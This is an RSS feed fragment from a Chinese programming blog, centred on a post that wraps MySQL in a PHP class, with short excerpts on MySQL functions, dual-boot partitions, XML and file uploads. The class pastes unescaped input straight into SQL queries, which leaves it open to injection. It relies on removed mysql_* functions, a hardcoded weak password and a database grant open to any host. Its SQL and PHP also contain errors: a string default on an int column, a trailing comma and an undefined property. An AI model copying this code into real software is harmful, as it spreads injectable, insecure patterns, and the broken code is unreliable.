 &lt;td bgcolor="#262626" height="30" width="30">&lt;/td>
 &lt;td>#262626&lt;/td>
 &lt;td bgcolor="#242424" height="30" width="30">&lt;/td>
 &lt;td>#242424&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#228b22" height="30" width="30">&lt;/td>
 &lt;td>#228B22&lt;/td>
 &lt;td bgcolor="#218868" height="30" width="30">&lt;/td>
 &lt;td>#218868&lt;/td>
 &lt;td bgcolor="#212121" height="30" width="30">&lt;/td>
 &lt;td>#212121&lt;/td>
 &lt;td bgcolor="#20b2aa" height="30" width="30">&lt;/td>
 &lt;td>#20B2AA&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#1f1f1f" height="30" width="30">&lt;/td>
 &lt;td>#1F1F1F&lt;/td>
 &lt;td bgcolor="#1e90ff" height="30" width="30">&lt;/td>
 &lt;td>#1E90FF&lt;/td>
 &lt;td bgcolor="#1e1e1e" height="30" width="30">&lt;/td>
 &lt;td>#1E1E1E&lt;/td>
 &lt;td bgcolor="#1c86ee" height="30" width="30">&lt;/td>
 &lt;td>#1C86EE&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#1c1c1c" height="30" width="30">&lt;/td>
 &lt;td>#1C1C1C&lt;/td>
 &lt;td bgcolor="#1a1a1a" height="30" width="30">&lt;/td>
 &lt;td>#1A1A1A&lt;/td>
 &lt;td bgcolor="#191970" height="30" width="30">&lt;/td>
 &lt;td>#191970&lt;/td>
 &lt;td bgcolor="#1874cd" height="30" width="30">&lt;/td>
 &lt;td>#1874CD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#171717" height="30" width="30">&lt;/td>
 &lt;td>#171717&lt;/td>
 &lt;td bgcolor="#141414" height="30" width="30">&lt;/td>
 &lt;td>#141414&lt;/td>
 &lt;td bgcolor="#121212" height="30" width="30">&lt;/td>
 &lt;td>#121212&lt;/td>
 &lt;td bgcolor="#104e8b" height="30" width="30">&lt;/td>
 &lt;td>#104E8B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#0f0f0f" height="30" width="30">&lt;/td>
 &lt;td>#0F0F0F&lt;/td>
 &lt;td bgcolor="#0d0d0d" height="30" width="30">&lt;/td>
 &lt;td>#0D0D0D&lt;/td>
 &lt;td bgcolor="#0a0a0a" height="30" width="30">&lt;/td>
 &lt;td>#0A0A0A&lt;/td>
 &lt;td bgcolor="#080808" height="30" width="30">&lt;/td>
 &lt;td>#080808&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#050505" height="30" width="30">&lt;/td>
 &lt;td>#050505&lt;/td>
 &lt;td bgcolor="#030303" height="30" width="30">&lt;/td>
 &lt;td>#030303&lt;/td>
 &lt;td bgcolor="#00ffff" height="30" width="30">&lt;/td>
 &lt;td>#00FFFF&lt;/td>
 &lt;td bgcolor="#00ff7f" height="30" width="30">&lt;/td>
 &lt;td>#00FF7F&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#00ff00" height="30" width="30">&lt;/td>
 &lt;td>#00FF00&lt;/td>
 &lt;td bgcolor="#00fa9a" height="30" width="30">&lt;/td>
 &lt;td>#00FA9A&lt;/td>
 &lt;td bgcolor="#00f5ff" height="30" width="30">&lt;/td>
 &lt;td>#00F5FF&lt;/td>
 &lt;td bgcolor="#00eeee" height="30" width="30">&lt;/td>
 &lt;td>#00EEEE&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#00ee76" height="30" width="30">&lt;/td>
 &lt;td>#00EE76&lt;/td>
 &lt;td bgcolor="#00ee00" height="30" width="30">&lt;/td>
 &lt;td>#00EE00&lt;/td>
 &lt;td bgcolor="#00e5ee" height="30" width="30">&lt;/td>
 &lt;td>#00E5EE&lt;/td>
 &lt;td bgcolor="#00ced1" height="30" width="30">&lt;/td>
 &lt;td>#00CED1&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#00cdcd" height="30" width="30">&lt;/td>
 &lt;td>#00CDCD&lt;/td>
 &lt;td bgcolor="#00cd66" height="30" width="30">&lt;/td>
 &lt;td>#00CD66&lt;/td>
 &lt;td bgcolor="#00cd00" height="30" width="30">&lt;/td>
 &lt;td>#00CD00&lt;/td>
 &lt;td bgcolor="#00c5cd" height="30" width="30">&lt;/td>
 &lt;td>#00C5CD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#00bfff" height="30" width="30">&lt;/td>
 &lt;td>#00BFFF&lt;/td>
 &lt;td bgcolor="#00b2ee" height="30" width="30">&lt;/td>
 &lt;td>#00B2EE&lt;/td>
 &lt;td bgcolor="#009acd" height="30" width="30">&lt;/td>
 &lt;td>#009ACD&lt;/td>
 &lt;td bgcolor="#008b8b" height="30" width="30">&lt;/td>
 &lt;td>#008B8B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#008b45" height="30" width="30">&lt;/td>
 &lt;td>#008B45&lt;/td>
 &lt;td bgcolor="#008b00" height="30" width="30">&lt;/td>
 &lt;td>#008B00&lt;/td>
 &lt;td bgcolor="#00868b" height="30" width="30">&lt;/td>
 &lt;td>#00868B&lt;/td>
 &lt;td bgcolor="#00688b" height="30" width="30">&lt;/td>
 &lt;td>#00688B&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#006400" height="30" width="30">&lt;/td>
 &lt;td>#006400&lt;/td>
 &lt;td bgcolor="#0000ff" height="30" width="30">&lt;/td>
 &lt;td>#0000FF&lt;/td>
 &lt;td bgcolor="#0000ee" height="30" width="30">&lt;/td>
 &lt;td>#0000EE&lt;/td>
 &lt;td bgcolor="#0000cd" height="30" width="30">&lt;/td>
 &lt;td>#0000CD&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td bgcolor="#0000aa" height="30" width="30">&lt;/td>
 &lt;td>#0000AA&lt;/td>
 &lt;td bgcolor="#00008b" height="30" width="30">&lt;/td>
 &lt;td>#00008B&lt;/td>
 &lt;td bgcolor="#000080" height="30" width="30">&lt;/td>
 &lt;td>#000080&lt;/td>
 &lt;td bgcolor="#000000" height="30" width="30">&lt;/td>
 &lt;td>#000000&lt;/td>
 &lt;/tr>
 &lt;/tbody>
 &lt;/table>
 &lt;/center>
 &lt;/div>
&lt;/body>
&lt;/html></description></item><item><title>PHP 之封装 MySQL 类</title><link>https://wyb0.cn/posts/2016/php-package-mysql-function/</link><pubDate>Fri, 03 Jun 2016 11:19:05 +0000</pubDate><guid>https://wyb0.cn/posts/2016/php-package-mysql-function/</guid><description>&lt;h3 id="0x00-configincphp内容如下">0x00 config.inc.php内容如下&lt;/h3>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
return array(
 &amp;#39;DB_HOST&amp;#39; =&amp;gt; &amp;#39;192.168.188.134&amp;#39;,
 &amp;#39;DB_NAME&amp;#39; =&amp;gt; &amp;#39;scoreboard&amp;#39;, 
 &amp;#39;DB_USER&amp;#39; =&amp;gt; &amp;#39;score&amp;#39;,
 &amp;#39;DB_PASS&amp;#39; =&amp;gt; &amp;#39;123456&amp;#39;,
 &amp;#39;DB_CHARSET&amp;#39; =&amp;gt; &amp;#39;utf8&amp;#39;,
 &amp;#39;IS_LOG&amp;#39; =&amp;gt; 1,//开启日志
 &amp;#39;LOGFILEPATH&amp;#39; =&amp;gt; &amp;#39;../log.txt&amp;#39;//日志路径
);
/*
 $database = require(&amp;#39;./config.php&amp;#39;);
 echo $database[&amp;#39;DB_TYPE&amp;#39;]; //输出&amp;#39;DB_TYPE&amp;#39;
*/

?&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="0x01-表设计如下">0x01 表设计如下&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">create&lt;/span> &lt;span style="color:#66d9ef">database&lt;/span> scoreboard;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>use scoreboard;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">drop&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#66d9ef">exists&lt;/span> users;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">create&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> users(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> id int &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> auto_increment &lt;span style="color:#66d9ef">primary&lt;/span> &lt;span style="color:#66d9ef">key&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gid int &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span> &lt;span style="color:#e6db74">&amp;#39;xiaoming&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;组id&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> username varchar(&lt;span style="color:#ae81ff">20&lt;/span>) &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span> &lt;span style="color:#e6db74">&amp;#39;xiaoming&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;用户名&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> password varchar(&lt;span style="color:#ae81ff">32&lt;/span>) &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span> &lt;span style="color:#e6db74">&amp;#39;123456&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;密码&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sex varchar(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span> &lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;性别&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> totalscore int &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span> &lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;个人总积分&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">drop&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#66d9ef">exists&lt;/span> &lt;span style="color:#66d9ef">share&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">create&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">share&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> id int &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> auto_increment &lt;span style="color:#66d9ef">primary&lt;/span> &lt;span style="color:#66d9ef">key&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uid int &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content varchar(&lt;span style="color:#ae81ff">1024&lt;/span>) &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span> &lt;span style="color:#e6db74">&amp;#39;content&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;分享内容&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">comment&lt;/span> varchar(&lt;span style="color:#ae81ff">1024&lt;/span>) &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;点评&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> date varchar(&lt;span style="color:#ae81ff">15&lt;/span>) &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span> &lt;span style="color:#e6db74">&amp;#39;20150101&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;分享日期&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">drop&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#66d9ef">exists&lt;/span> score;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">create&lt;/span> &lt;span style="color:#66d9ef">table&lt;/span> score(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> id int &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> auto_increment &lt;span style="color:#66d9ef">primary&lt;/span> &lt;span style="color:#66d9ef">key&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uid int &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span> &lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;用户id&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> score int &lt;span style="color:#66d9ef">not&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#66d9ef">default&lt;/span> &lt;span style="color:#e6db74">&amp;#39;0&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">comment&lt;/span> &lt;span style="color:#e6db74">&amp;#39;用户单次积分&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">grant&lt;/span> &lt;span style="color:#66d9ef">all&lt;/span> &lt;span style="color:#66d9ef">privileges&lt;/span> &lt;span style="color:#66d9ef">on&lt;/span> scoreboard.&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">to&lt;/span> &lt;span style="color:#e6db74">&amp;#39;score&amp;#39;&lt;/span>&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#e6db74">&amp;#39;%&amp;#39;&lt;/span> identified &lt;span style="color:#66d9ef">by&lt;/span> &lt;span style="color:#e6db74">&amp;#39;123456&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">-- 或者只给特定权限
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">-- grant select,update,delete on scoreboard.* to &amp;#39;score&amp;#39;@&amp;#39;%&amp;#39; identified by &amp;#39;123456&amp;#39;;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flush &lt;span style="color:#66d9ef">privileges&lt;/span>;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-封装类如下">0x02 封装类如下&lt;/h3>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php

class mysql {
 private $logfilepath;
 private $is_log;
 private $hlog;
 private $conn;

 //构造函数
 public function __construct() {
 $config = include_once(dirname(__FILE__).&amp;#34;/../config/config.inc.php&amp;#34;);
 $this-&amp;gt;is_log = $config[&amp;#39;IS_LOG&amp;#39;];
 $this-&amp;gt;logfilepath = $config[&amp;#39;LOGFILEPATH&amp;#39;];

 if ($this-&amp;gt;is_log){
 $handle = fopen($this-&amp;gt;logfilepath,&amp;#34;a+&amp;#34;);
 $this-&amp;gt;hlog = $handle;
 }

 $this-&amp;gt;conn = $this-&amp;gt;connect($config[&amp;#39;DB_HOST&amp;#39;],$config[&amp;#39;DB_USER&amp;#39;],$config[&amp;#39;DB_PASS&amp;#39;],$config[&amp;#39;DB_NAME&amp;#39;],$config[&amp;#39;DB_CHARSET&amp;#39;]);
 }

 //连接数据库
 public function connect($dbhost, $dbuser, $dbpass, $dbname, $dbcharset) {
 $this-&amp;gt;conn = @mysql_connect($dbhost,$dbuser,$dbpass);
 if (!$this-&amp;gt;conn) {
 $msg = &amp;#34;连接数据库失败：&amp;#34;.mysql_error();
 $this-&amp;gt;write_log($msg);
 die($msg);
 } else {
 if (!@mysql_select_db($dbname)) {
 $msg = &amp;#34;连接数据库成功，但选择数据库失败：&amp;#34;.mysql_error();
 $this-&amp;gt;write_log($msg);
 die($msg);
 } else {
 $msg = &amp;#34;连接数据库成功，且选择数据库成功&amp;#34;;
 $this-&amp;gt;write_log($msg);
 }
 }

 @mysql_query(&amp;#34;set names &amp;#34;.$dbcharset);

 }

 //执行语句
 public function query($sql) {
 
 $result = @mysql_query($sql);

 if (!$result) {
 $this-&amp;gt;write_log(&amp;#39;mysql_query error:&amp;#39;.mysql_error());
 } else {
 $this-&amp;gt;write_log(&amp;#39;执行语句：&amp;#39;.$sql.&amp;#39; 且执行成功&amp;#39;);
 }
 return $result;
 }

 //查询一条数据
 public function select_one($tab,$column = &amp;#34;*&amp;#34;,$condition = &amp;#39;&amp;#39;,$debug=False) { //查询函数
 $condition = $condition ? &amp;#39; where &amp;#39; . $condition : NULL;
 $sql = &amp;#34;select $column from $tab $condition &amp;#34;;
 if ($debug) {
 echo &amp;#39;将执行语句：&amp;#39;.$sql.&amp;#39;&amp;lt;br /&amp;gt;&amp;#39;;
 } else {
 $result = $this-&amp;gt;query($sql);
 $row = @mysql_fetch_assoc($result);
 return $row;
 }
 }

 //查询多条数据
 public function select_more($tab,$column = &amp;#34;*&amp;#34;,$condition = &amp;#39;&amp;#39;,$debug=False) { //查询函数
 $condition = $condition ? &amp;#39; where &amp;#39; . $condition : NULL;
 $sql = &amp;#34;select $column from $tab $condition&amp;#34;;
 if ($debug) {
 echo &amp;#39;将执行语句：&amp;#39;.$sql;
 } else {
 $result = $this-&amp;gt;query($sql);
 $i = 0;
 $rows = array();
 while ($row = @mysql_fetch_assoc($result)) {
 $rows[$i] = $row;
 // print_r($rows[$i]);
 $i++; 
 }
 return $rows;
 }
 }

 //返回结果集
 public function echo_result($tab,$column = &amp;#34;*&amp;#34;,$condition = &amp;#39;&amp;#39;,$debug=False) { //查询函数
 $condition = $condition ? &amp;#39; where &amp;#39; . $condition : NULL;
 $sql = &amp;#34;select $column from $tab $condition &amp;#34;;
 if ($debug) {
 echo &amp;#39;将执行语句：&amp;#39;.$sql.&amp;#39;&amp;lt;br /&amp;gt;&amp;#39;;
 } else {
 return $this-&amp;gt;query($sql);
 }
 }

 //插入数据
 public function insert($tab,$arr,$debug=False) {
 $value = &amp;#39;&amp;#39;;
 $column = &amp;#39;&amp;#39;;
 foreach ($arr as $k =&amp;gt; $v) {
 $column .= &amp;#34;,{$k}&amp;#34;;
 $value .= &amp;#34;,&amp;#39;{$v}&amp;#39;&amp;#34;;
 }
 $column = substr($column, 1);
 $value = substr($value, 1);

 $sql = &amp;#34;insert into $tab($column) values($value)&amp;#34;;
 if ($debug) {
 echo &amp;#39;将执行语句：&amp;#39;.$sql;
 } else {
 $this-&amp;gt;query($sql);
 $num = $this-&amp;gt;affected_num();
 $this-&amp;gt;write_log(&amp;#34;受影响行数：&amp;#34;.$num);
 return $num; //返回受影响行数
 }
 }

 //获取最后插入的id
 public function insert_id() {
 $id = mysql_insert_id($this-&amp;gt;link_id);
 $this-&amp;gt;write_log(&amp;#39;最后插入的id为：&amp;#39;.$id);
 return $id;
 }

 //更新数据
 public function update($tab,$arr,$condition = &amp;#39;&amp;#39;,$debug=False) {
 if (!$condition) {
 die(&amp;#34;error&amp;#34;.mysql_error());
 } else {
 $condition = &amp;#39;where &amp;#39; . $condition;
 }
 
 $value = &amp;#39;&amp;#39;;
 foreach ($arr as $k =&amp;gt; $v) {
 $value .= &amp;#34;{$k}=&amp;#39;{$v}&amp;#39;,&amp;#34;;
 }
 $value = substr($value,0,-1);

 $sql = &amp;#34;update $tab set $value $condition&amp;#34;;
 if ($debug) {
 echo &amp;#39;将执行语句：&amp;#39;.$sql;
 } else {
 $this-&amp;gt;query($sql);
 $num = $this-&amp;gt;affected_num();
 $this-&amp;gt;write_log(&amp;#34;受影响行数：&amp;#34;.$num);

 return $num; 
 }
 }

 //删除数据
 public function delete($tab,$condition=&amp;#39;&amp;#39;,$debug=False) {
 $condition = $condition ? &amp;#39; where &amp;#39; . $condition : NULL;
 $sql = &amp;#34;delete from $tab $condition&amp;#34;;
 if ($debug) {
 echo &amp;#39;将执行语句：&amp;#39;.$sql;
 } else {
 $this-&amp;gt;query($sql);
 $num = $this-&amp;gt;affected_num();
 $this-&amp;gt;write_log(&amp;#34;受影响行数：&amp;#34;.$num);
 return $num; //返回受影响行数
 }
 }

 //返回受影响行数
 public function affected_num() {
 $num = @mysql_affected_rows();
 return $num;
 }

 //写入日志
 public function write_log($msg=&amp;#39;&amp;#39;) {
 if ($this-&amp;gt;is_log){
 $text = date(&amp;#34;Y-m-d H:i:s&amp;#34;).&amp;#34; &amp;#34;.$msg.&amp;#34;\r\n&amp;#34;;
 fwrite($this-&amp;gt;hlog,$text);
 }
 }

 //关闭数据库连接
 public function close() { 
 mysql_close($this-&amp;gt;conn);
 }

 //析构函数
 public function __destruct() {
 if($this-&amp;gt;is_log){
 fclose($this-&amp;gt;hlog);
 }
 }
}

 //$db = new mysql();
 
 // //select_one($tab,$column = &amp;#34;*&amp;#34;,$condition = &amp;#39;&amp;#39;)
 // $rows = $db-&amp;gt;select_more(&amp;#39;share&amp;#39;,&amp;#39;*&amp;#39;);
 // print_r($rows[0]);
 // print_r($rows[1]);

 // //insert($tab,$arr)
 // $arr = array();
 // $arr[&amp;#39;uid&amp;#39;] = &amp;#39;3&amp;#39;;
 // $arr[&amp;#39;content&amp;#39;] = &amp;#39;xss&amp;#39;;
 // $arr[&amp;#39;comment&amp;#39;] = &amp;#39;very good&amp;#39;;
 // $arr[&amp;#39;date&amp;#39;] = &amp;#39;1464082630&amp;#39;;
 // $db-&amp;gt;insert(&amp;#39;share&amp;#39;,$arr);

 // //update($tab,$arr,$condition = &amp;#39;&amp;#39;)
 // $arr = array();
 // $arr[&amp;#39;content&amp;#39;] = &amp;#39;xssxssxssxssxss&amp;#39;;
 // $arr[&amp;#39;comment&amp;#39;] = &amp;#39;goodgoodgoodgood&amp;#39;;
 // $condition = &amp;#39;id &amp;gt; 5&amp;#39;;
 // $db-&amp;gt;update(&amp;#39;share&amp;#39;,$arr,$condition);

 //$db-&amp;gt;delete(&amp;#34;share&amp;#34;,&amp;#34;id between 10 and 15&amp;#34;);

 //$db-&amp;gt;close();
?&amp;gt;
&lt;/code>&lt;/pre></description></item><item><title>PHP 之 MySQL 常用函数</title><link>https://wyb0.cn/posts/2016/php-mysql-common-function/</link><pubDate>Thu, 02 Jun 2016 13:21:49 +0000</pubDate><guid>https://wyb0.cn/posts/2016/php-mysql-common-function/</guid><description>&lt;h3 id="0x00-处理函数">0x00 处理函数&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>mysql_connect(server,user,pwd,newlink,clientflag)&lt;br>
连接服务器的函数,成功则返回MySQL标识，失败则返回FALSE&lt;/p>
&lt;/li>
&lt;li>
&lt;p>mysql_select_db(database,connection)&lt;br>
选择数据库的函数，成功则返回true，失败则返回false&lt;/p></description></item><item><title>win/ubuntu 双系统分区设置</title><link>https://wyb0.cn/posts/2016/win-and-ubuntu-partition/</link><pubDate>Tue, 31 May 2016 23:35:06 +0000</pubDate><guid>https://wyb0.cn/posts/2016/win-and-ubuntu-partition/</guid><description>&lt;h3 id="win10和ubuntu双系统分区设置">win10和ubuntu双系统分区设置&lt;/h3>
&lt;ol>
&lt;li>硬盘采用uefi格式&lt;/li>
&lt;li>硬盘首部留400M空间，是FAT16的格式，用来存放win的引导信息&lt;/li>
&lt;li>在硬盘末尾给ubuntu划分50G左右空间&lt;/li>
&lt;li>ubuntu的/分区，格式为ext4，空间为40G&lt;/li>
&lt;li>ubuntu的/home分区，格式为ext4，空间为10G&lt;/li>
&lt;li>ubuntu的/boot分区，格式为ext4,空间为200M&lt;/li>
&lt;li>ubuntu的/swap分区，格式为swap，空间为200M&lt;/li>
&lt;li>ubuntu的引导分区为/boot&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://wyb0.cn/img/post/hard_disk_partition1.png" alt="双系统磁盘分区">&lt;/p></description></item><item><title>XML 基础</title><link>https://wyb0.cn/posts/2016/xml-basis/</link><pubDate>Wed, 25 May 2016 13:59:59 +0000</pubDate><guid>https://wyb0.cn/posts/2016/xml-basis/</guid><description>&lt;h3 id="0x00-xml简介">0x00 XML简介&lt;/h3>
&lt;p>1、xml的设计宗旨是传输数据，而并非显示数据&lt;br>
2、xms是不作为的，它被设计用来结构化、存储以及传输信息&lt;br>
3、xml只是纯文本，独立于软硬件和应用程序&lt;br>
4、xml可供任何软硬设备读取数据&lt;br>
5、xml可以自定义标签&lt;br>
6、xml具有自我描述性&lt;br>
7、xml是对html的补充&lt;br>
8、xml常用于简化数据的存储和共享&lt;/p></description></item><item><title>PHP 之上传与下载</title><link>https://wyb0.cn/posts/2016/php-upload-and-download/</link><pubDate>Tue, 24 May 2016 08:31:09 +0000</pubDate><guid>https://wyb0.cn/posts/2016/php-upload-and-download/</guid><description>&lt;h3 id="0x00-上传">0x00 上传&lt;/h3>
&lt;ul>
&lt;li>客户端设置&lt;br>
客户端使用form表单上传文件，在form表单中必须指明enctype和method属性的值&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#f92672">html&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#f92672">head&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;&lt;span style="color:#f92672">title&lt;/span>&amp;gt;post&amp;lt;/&lt;span style="color:#f92672">title&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/&lt;span style="color:#f92672">head&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#f92672">body&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#a6e22e">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;xx.php&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">mothod&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;post&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">enctype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;multipart/form-data&amp;#34;&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;file&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;myfile&amp;#34;&lt;/span> /&amp;gt;&amp;lt;&lt;span style="color:#f92672">br&lt;/span> /&amp;gt;
